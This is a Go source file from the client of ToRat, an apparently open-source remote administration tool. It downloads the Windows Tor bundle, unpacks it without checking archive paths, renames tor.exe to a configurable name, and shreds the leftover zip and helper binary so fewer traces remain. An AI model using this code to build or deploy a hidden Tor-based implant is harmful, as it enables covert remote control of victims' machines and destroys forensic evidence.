package client

import (
	"archive/zip"
	"errors"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/lu4p/ToRat_client/shred"
)

// TODO: Add option to embed Tor

func downloadTor() error {
	log.Println("downloadTor")
	resp, err := http.Get("https://www.torproject.org/dist/torbrowser/8.0.4/tor-win32-0.3.4.9.zip")
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return errors.New("bad status")
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(TempZip, data, os.ModePerm)
	if err != nil {
		return err
	}
	return nil
}

func unzipTor(archive, target string) error {
	log.Println("unzipTor")
	reader, err := zip.OpenReader(archive)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(target, os.ModePerm); err != nil {
		return err
	}

	for _, file := range reader.File {
		if strings.Contains(file.Name, "Data") {
			continue
		}
		path := filepath.Join(target, file.Name)
		if file.FileInfo().IsDir() {
			os.MkdirAll(path, file.Mode())
			continue
		}

		fileReader, err := file.Open()
		if err != nil {
			return err
		}
		defer fileReader.Close()

		targetFile, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode())
		if err != nil {
			return err
		}
		defer targetFile.Close()

		if _, err := io.Copy(targetFile, fileReader); err != nil {
			return err
		}
	}

	return nil
}

func setupTor() error {
	log.Println("setupTor")
	err := unzipTor(TempZip, Path)
	if err != nil {
		return err
	}
	err = os.Rename(filepath.Join(Path, "Tor"), TorPath)
	if err != nil {
		return err
	}
	err = os.Rename(filepath.Join(TorPath, "tor.exe"), TorExe)
	if err != nil {
		return err
	}
	shred.File(filepath.Join(TorPath, "tor-gencert.exe"), true)
	shred.File(TempZip, true)
	os.Mkdir(TorData, os.ModePerm)
	return nil
}
